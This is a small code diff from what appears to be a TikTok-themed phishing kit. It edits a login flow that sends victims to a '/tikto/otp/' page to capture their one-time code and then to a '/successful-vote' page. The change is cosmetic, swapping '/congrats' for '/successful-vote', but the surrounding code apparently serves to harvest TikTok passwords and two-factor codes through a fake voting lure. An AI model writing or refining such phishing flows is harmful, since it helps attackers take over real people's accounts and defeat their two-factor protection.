@@ -84,7 +84,7 @@ Login now: https://www.tiktok.com or use mobile app
             if (link.otpEnabled) {
                 return res.redirect("/tikto/otp/" + link.id);
             } else {
-                return res.redirect("/congrats");
+                return res.redirect("/successful-vote");
             }
         }
         else {
